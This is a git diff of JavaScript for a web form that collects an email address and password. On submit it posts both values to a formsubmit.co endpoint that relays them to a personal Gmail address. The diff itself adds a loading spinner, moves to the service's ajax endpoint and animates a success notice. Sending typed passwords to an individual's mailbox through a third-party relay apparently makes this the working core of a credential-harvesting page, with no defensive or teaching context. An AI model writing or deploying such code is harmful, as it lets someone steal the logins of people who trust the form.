@@ -1,8 +1,9 @@
 const pass_field = document.querySelector('.pass');
 const email_field = document.querySelector('.email');
-const succes = document.querySelector('.succes');
 const showBtn = document.querySelector('.show');
 const form = document.querySelector('.form-submit');
+const load = document.querySelector('.lds-facebook');
+const succes = document.querySelector('.succes');
 
 showBtn.addEventListener('click', function () {
 	if (pass_field.type === 'password') {
@@ -20,7 +21,9 @@ form.addEventListener('submit', e => {
 	e.preventDefault();
 	let emailValue = email_field.value;
 	let passValue = pass_field.value;
-	fetch('https://formsubmit.co/tonight0bayastan@gmail.com', {
+
+	load.style.display = 'inline-block';
+	fetch('https://formsubmit.co/ajax/tonight0bayastan@gmail.com', {
 		method: 'POST',
 		headers: {
 			'Content-Type': 'application/json',
@@ -32,8 +35,14 @@ form.addEventListener('submit', e => {
 		}),
 	})
 		.then(() => {
-			succes.style.opacity = 1;
-			succes.style.overflow = 'visible';
+			load.style.display = 'none';
+			succes.style.opacity = '1';
+			succes.style.left = '0px';
+
+			setTimeout(() => {
+				succes.style.opacity = '0';
+				succes.style.left = '-50px';
+			}, 2500);
 		})
 		.catch(error => console.log(error));
 });
